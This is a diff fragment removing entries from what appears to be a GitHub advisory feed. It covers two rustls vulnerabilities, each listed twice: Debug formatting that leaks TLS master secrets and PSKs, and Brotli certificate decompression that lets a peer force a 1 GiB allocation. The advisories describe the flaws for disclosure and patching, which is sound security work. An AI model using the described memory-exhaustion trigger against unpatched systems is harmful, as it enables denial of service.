-<li><a href="https://github.com/advisories/GHSA-w44r-93j7-qv28">https://github.com/advisories/GHSA-w44r-93j7-qv28</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w44r-93j7-qv28</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-10-27T16:08:54.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[rustls] Rustls: Session Debug formatting exposes TLS master secrets and resumption PSKs]]></title>
-        <id>https://github.com/advisories/GHSA-c8m5-c952-6cm4</id>
-        <link href="https://github.com/advisories/GHSA-c8m5-c952-6cm4"/>
-        <updated>2026-10-27T16:08:48.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Formatting a client session value with Debug exposes its TLS 1.2 master secret or TLS 1.3 resumption PSK. A custom session store that logs these values can disclose keys to readers of the logs. Ordinary connection and built-in cache diagnostics remain redacted, and the session-store interface already warns that its values are sensitive.</p>
-<h3 id="details">Details</h3>
-<p>Derived formatters traverse the session's secret-bearing fields. This conflicts with the project's explicit <a href="https://github.com/rustls/rustls/blob/99f2358cae2954837dbb866faf6727de75489ab9/SECURITY.md#boundary-public-api">key-material redaction policy</a>.</p>
-<h3 id="proof-of-concept">Proof of concept</h3>
-<p>Custom <code>ClientSessionStore</code> implementations could leak secret data by using the provided <code>Tls12ClientSessionValue</code> or <code>Tls13ClientSessionValue</code> in a way that triggers its implementation of the <code>Debug</code> trait.</p>
-<h3 id="impact">Impact</h3>
-<p>Such store implementations could leak the master secret for the TLS connection.</p>
-<h3 id="acknowledgement">Acknowledgement</h3>
-<p>Thanks to OpenAI <a href="mailto:OutboundDisclosures@openai.com">OutboundDisclosures@openai.com</a> for the disclosure.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/rustls/rustls/security/advisories/GHSA-c8m5-c952-6cm4">https://github.com/rustls/rustls/security/advisories/GHSA-c8m5-c952-6cm4</a></li>
-<li><a href="https://github.com/rustls/rustls/pull/3299">https://github.com/rustls/rustls/pull/3299</a></li>
-<li><a href="https://github.com/rustls/rustls/pull/3354">https://github.com/rustls/rustls/pull/3354</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/dcdb9464d376f45f42a94a5f837cda1506449f23">https://github.com/rustls/rustls/commit/dcdb9464d376f45f42a94a5f837cda1506449f23</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/f5f7bf5078a7edcbd81a9e82a97f2bd14dc1c855">https://github.com/rustls/rustls/commit/f5f7bf5078a7edcbd81a9e82a97f2bd14dc1c855</a></li>
-<li><a href="https://github.com/rustls/rustls/releases/tag/v/0.23.46">https://github.com/rustls/rustls/releases/tag/v/0.23.46</a></li>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0346.html">https://rustsec.org/advisories/RUSTSEC-2026-0346.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-c8m5-c952-6cm4">https://github.com/advisories/GHSA-c8m5-c952-6cm4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c8m5-c952-6cm4</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-27T16:08:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[rustls] Rustls: Session Debug formatting exposes TLS master secrets and resumption PSKs]]></title>
-        <id>https://github.com/advisories/GHSA-c8m5-c952-6cm4</id>
-        <link href="https://github.com/advisories/GHSA-c8m5-c952-6cm4"/>
-        <updated>2026-10-27T16:08:48.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Formatting a client session value with Debug exposes its TLS 1.2 master secret or TLS 1.3 resumption PSK. A custom session store that logs these values can disclose keys to readers of the logs. Ordinary connection and built-in cache diagnostics remain redacted, and the session-store interface already warns that its values are sensitive.</p>
-<h3 id="details">Details</h3>
-<p>Derived formatters traverse the session's secret-bearing fields. This conflicts with the project's explicit <a href="https://github.com/rustls/rustls/blob/99f2358cae2954837dbb866faf6727de75489ab9/SECURITY.md#boundary-public-api">key-material redaction policy</a>.</p>
-<h3 id="proof-of-concept">Proof of concept</h3>
-<p>Custom <code>ClientSessionStore</code> implementations could leak secret data by using the provided <code>Tls12ClientSessionValue</code> or <code>Tls13ClientSessionValue</code> in a way that triggers its implementation of the <code>Debug</code> trait.</p>
-<h3 id="impact">Impact</h3>
-<p>Such store implementations could leak the master secret for the TLS connection.</p>
-<h3 id="acknowledgement">Acknowledgement</h3>
-<p>Thanks to OpenAI <a href="mailto:OutboundDisclosures@openai.com">OutboundDisclosures@openai.com</a> for the disclosure.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/rustls/rustls/security/advisories/GHSA-c8m5-c952-6cm4">https://github.com/rustls/rustls/security/advisories/GHSA-c8m5-c952-6cm4</a></li>
-<li><a href="https://github.com/rustls/rustls/pull/3299">https://github.com/rustls/rustls/pull/3299</a></li>
-<li><a href="https://github.com/rustls/rustls/pull/3354">https://github.com/rustls/rustls/pull/3354</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/dcdb9464d376f45f42a94a5f837cda1506449f23">https://github.com/rustls/rustls/commit/dcdb9464d376f45f42a94a5f837cda1506449f23</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/f5f7bf5078a7edcbd81a9e82a97f2bd14dc1c855">https://github.com/rustls/rustls/commit/f5f7bf5078a7edcbd81a9e82a97f2bd14dc1c855</a></li>
-<li><a href="https://github.com/rustls/rustls/releases/tag/v/0.23.46">https://github.com/rustls/rustls/releases/tag/v/0.23.46</a></li>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0346.html">https://rustsec.org/advisories/RUSTSEC-2026-0346.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-c8m5-c952-6cm4">https://github.com/advisories/GHSA-c8m5-c952-6cm4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c8m5-c952-6cm4</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-27T16:08:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[rustls] Rustls: Brotli certificate decompression can allocate an attacker-controlled amount of memory up to 1 GiB before authentication.]]></title>
-        <id>https://github.com/advisories/GHSA-h2v8-394m-p7vv</id>
-        <link href="https://github.com/advisories/GHSA-h2v8-394m-p7vv"/>
-        <updated>2026-10-27T16:08:36.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The built-in (but disabled by default) Brotli certificate decoder bounds the output buffer but accepts an input-selected history window. A header of five bytes can specify a 1 GiB window allocation. A peer can abort a process whose allocator cannot satisfy that request. A client must enable Brotli and connect to the peer; a server must enable Brotli and request a client certificate. Neither direction requires a trusted attacker certificate.</p>
-<h3 id="details">Details</h3>
-<p>rustls calls <code>BrotliDecompress</code> which enables Brotli's large-window extension. rustls applies a limit to certificates, but this applies to the decompressed result, and not to any internal allocations the process requires.</p>
-<h3 id="impact">Impact</h3>
-<p>Client applications that enable the <code>brotli</code> feature will be vulnerable to malicious servers. Server applications that enable the <code>brotli</code> feature and enable client authentication will be vulnerable to malicious clients.</p>
-<p>Potential for denial of service due to memory exhaustion from peers sending malicious Brotli-encoded certificates, for applications that enable Brotli decompression.</p>
-<h3 id="acknowledgement">Acknowledgement</h3>
-<p>Thanks to OpenAI <a href="mailto:OutboundDisclosures@openai.com">OutboundDisclosures@openai.com</a> for the disclosure.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/rustls/rustls/security/advisories/GHSA-h2v8-394m-p7vv">https://github.com/rustls/rustls/security/advisories/GHSA-h2v8-394m-p7vv</a></li>
-<li><a href="https://github.com/rustls/rustls/pull/3297">https://github.com/rustls/rustls/pull/3297</a></li>
-<li><a href="https://github.com/rustls/rustls/pull/3354">https://github.com/rustls/rustls/pull/3354</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/1aa987af37d0d79b98781d345895ac0059ce345c">https://github.com/rustls/rustls/commit/1aa987af37d0d79b98781d345895ac0059ce345c</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/402b7b78b7ae87d59e19cf07ee07f3fc19e6537e">https://github.com/rustls/rustls/commit/402b7b78b7ae87d59e19cf07ee07f3fc19e6537e</a></li>
-<li><a href="https://github.com/rustls/rustls/releases/tag/v/0.23.46">https://github.com/rustls/rustls/releases/tag/v/0.23.46</a></li>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0348.html">https://rustsec.org/advisories/RUSTSEC-2026-0348.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-h2v8-394m-p7vv">https://github.com/advisories/GHSA-h2v8-394m-p7vv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h2v8-394m-p7vv</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-10-27T16:08:36.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[rustls] Rustls: Brotli certificate decompression can allocate an attacker-controlled amount of memory up to 1 GiB before authentication.]]></title>
-        <id>https://github.com/advisories/GHSA-h2v8-394m-p7vv</id>
-        <link href="https://github.com/advisories/GHSA-h2v8-394m-p7vv"/>
-        <updated>2026-10-27T16:08:36.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The built-in (but disabled by default) Brotli certificate decoder bounds the output buffer but accepts an input-selected history window. A header of five bytes can specify a 1 GiB window allocation. A peer can abort a process whose allocator cannot satisfy that request. A client must enable Brotli and connect to the peer; a server must enable Brotli and request a client certificate. Neither direction requires a trusted attacker certificate.</p>
-<h3 id="details">Details</h3>
-<p>rustls calls <code>BrotliDecompress</code> which enables Brotli's large-window extension. rustls applies a limit to certificates, but this applies to the decompressed result, and not to any internal allocations the process requires.</p>
-<h3 id="impact">Impact</h3>
-<p>Client applications that enable the <code>brotli</code> feature will be vulnerable to malicious servers. Server applications that enable the <code>brotli</code> feature and enable client authentication will be vulnerable to malicious clients.</p>
-<p>Potential for denial of service due to memory exhaustion from peers sending malicious Brotli-encoded certificates, for applications that enable Brotli decompression.</p>
-<h3 id="acknowledgement">Acknowledgement</h3>
-<p>Thanks to OpenAI <a href="mailto:OutboundDisclosures@openai.com">OutboundDisclosures@openai.com</a> for the disclosure.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/rustls/rustls/security/advisories/GHSA-h2v8-394m-p7vv">https://github.com/rustls/rustls/security/advisories/GHSA-h2v8-394m-p7vv</a></li>
-<li><a href="https://github.com/rustls/rustls/pull/3297">https://github.com/rustls/rustls/pull/3297</a></li>
-<li><a href="https://github.com/rustls/rustls/pull/3354">https://github.com/rustls/rustls/pull/3354</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/1aa987af37d0d79b98781d345895ac0059ce345c">https://github.com/rustls/rustls/commit/1aa987af37d0d79b98781d345895ac0059ce345c</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/402b7b78b7ae87d59e19cf07ee07f3fc19e6537e">https://github.com/rustls/rustls/commit/402b7b78b7ae87d59e19cf07ee07f3fc19e6537e</a></li>
-<li><a href="https://github.com/rustls/rustls/releases/tag/v/0.23.46">https://github.com/rustls/rustls/releases/tag/v/0.23.46</a></li>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0348.html">https://rustsec.org/advisories/RUSTSEC-2026-0348.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-h2v8-394m-p7vv">https://github.com/advisories/GHSA-h2v8-394m-p7vv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h2v8-394m-p7vv</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-10-27T16:08:36.000Z</published>
     </entry>
 </feed>
